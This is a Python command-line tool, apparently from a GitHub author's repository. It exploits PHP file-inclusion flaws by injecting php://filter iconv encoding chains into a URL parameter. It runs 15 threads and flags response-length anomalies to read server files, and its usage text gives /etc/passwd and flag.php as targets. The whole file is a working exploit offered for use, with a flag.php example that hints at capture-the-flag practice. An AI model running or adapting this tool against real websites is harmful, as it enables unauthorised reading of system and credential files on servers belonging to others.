#!/usr/bin/python3
# @Мартин.
import sys,argparse,textwrap,requests,random
import time
from loguru import logger
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
Version = "@Мартин. Pseudo protocol Tool V1.0.0"
Logo=f'''
  /$$$$$$              /$$                                             /$$             /$$    
 /$$__  $$            | $$                                            |__/            | $$    
| $$  \ $$ /$$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$  /$$  /$$$$$$$ /$$$$$$  
| $$$$$$$$| $$__  $$|_  $$_/   |____  $$ /$$__  $$ /$$__  $$| $$__  $$| $$ /$$_____/|_  $$_/  
| $$__  $$| $$  \ $$  | $$      /$$$$$$$| $$  \ $$| $$  \ $$| $$  \ $$| $$|  $$$$$$   | $$    
| $$  | $$| $$  | $$  | $$ /$$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$ \____  $$  | $$ /$$
| $$  | $$| $$  | $$  |  $$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$  | $$| $$ /$$$$$$$/  |  $$$$/
|__/  |__/|__/  |__/   \___/   \_______/ \____  $$ \______/ |__/  |__/|__/|_______/    \___/  
                                         /$$  \ $$                                            
                                        |  $$$$$$/                                            
                                         \______/                                                     
                                                    Github==>https://github.com/MartinxMax    
                                                    {Version}  
'''


def Init_Loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )
    logger.add("Unusual.log", level="WARNING")
class Main_Class():
    def __init__(self,args):
        self.URL=args.URL
        self.FILE=args.FILE
        self.statcode=[]
        self.duplicates=0
    def Run(self):
        if '*' in self.URL and self.FILE:
            self.Load_PAayload()
            if self.Test_Lenght():
                self.RunMain()
        else:
            logger.error("You must fill in the correct URL parameters '-url www.xxx.com?a=* -file /etc/passwd'")


    def Load_PAayload(self):
        self.Payload = [
            'UCS-4*', 'UCS-4BE', 'UCS-4LE*', 'UCS-2', 'UCS-2BE', 'UCS-2LE', 'UTF-32*', 'UTF-32BE*', 'UTF-32LE*',
            'UTF-16*', 'UTF-16BE*', 'UTF-16LE*', 'UTF-7', 'UTF7-IMAP', 'UTF-8*', 'ASCII*', 'EUC-JP*', 'SJIS*',
            'eucJP-win*', 'SJIS-win*', 'ISO-2022-JP', 'SO-2022-JP-MS', 'CP932', 'CP51932', 'SJIS-Mobile#DOCOMO',
            'SJIS-Mobile#KDDI', 'SJIS-Mobile#SOFTBANK', 'UTF-8-Mobile#DOCOMO', 'UTF-8-Mobile#KDDI-A',
            'UTF-8-Mobile#KDDI-B', 'UTF-8-Mobile#SOFTBANK', 'ISO-2022-JP-MOBILE#KDDI', 'JIS', 'JIS-ms', 'CP50220',
            'CP50220raw', 'CP50221', 'CP50222', 'ISO-8859-1*', 'ISO-8859-2*', 'ISO-8859-3*', 'ISO-8859-4*',
            'ISO-8859-5*', 'ISO-8859-6*', 'ISO-8859-7*', 'ISO-8859-8*', 'ISO-8859-9*', 'ISO-8859-10*',
            'ISO-8859-13*', 'ISO-8859-14*', 'ISO-8859-15*', 'ISO-8859-16*', 'byte2be', 'byte2le', 'byte4be', 'byte4le',
            'BASE64', 'HTML-ENTITIES', '7bit', '8bit', 'EUC-CN*', 'CP936', 'GB18030', 'HZ', 'EUC-TW*', 'CP950',
            'BIG-5*',
            'EUC-KR*', 'UHC', 'ISO-2022-KR', 'Windows-1251', 'Windows-1252', 'CP866', 'KOI8-R*', 'KOI8-U*', 'ArmSCII-8'
        ]


    def RunMain(self):
        with ThreadPoolExecutor(max_workers=15, thread_name_prefix="BY_Martin_") as threadPool:
                for payload0 in self.Payload:
                    threadPool.submit(self.Send_Request,payload0)


    def Send_Request(self,payload0,debug=False):
        for payload1 in self.Payload:
            time.sleep(random.randint(1, 2))
            try:
                Status = requests.get(self.URL.replace('*',f"php://filter//convert.iconv.{payload0}.{payload1}/resource={self.FILE}"), timeout=2)
            except Exception as e:
                continue
            else:
                if debug:
                    self.statcode.append(len(Status.text))
                    logger.info(
                        f"[{str(Status.status_code)}] [Lenght]:{len(Status.text)} [URL] {self.URL.replace('*', f'php://filter//convert.iconv.{payload0}.{payload1}/resource={self.FILE}')}")
                    break
                if self.duplicates != len(Status.text):
                    logger.warning(f"[{str(Status.status_code)}] [Lenght]:{len(Status.text)} [URL] {self.URL.replace('*',f'php://filter//convert.iconv.{payload0}.{payload1}/resource={self.FILE}')}")


    def Test_Lenght(self):
        logger.info("Testing [Payload]...")
        for payload0 in self.Payload[:10]:
                self.Send_Request(payload0,True)
        if self.Get_Unusual_Code():
            logger.info(f"Test [Payload] successful Filter failure lenght [{self.duplicates}]")
            return True
        else:
            logger.info("Test failed")
            return False
    def Get_Unusual_Code(self):
        counter = Counter(self.statcode)
        most_common = counter.most_common(1)[0]
        self.duplicates = most_common[0]
        return True

def Main():
    print(Logo)
    Init_Loger()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Basic usage:
            python3 {MPHP} -url http://xxx.com?a=* -file flag.php
            '''.format(MPHP = sys.argv[0]
                )))
    parser.add_argument('-url', '--URL',default='', help='Target_URL')
    parser.add_argument('-file', '--FILE', default='', help='File_Path')
    args = parser.parse_args()
    Main_Class(args).Run()


if __name__ == '__main__':
    Main()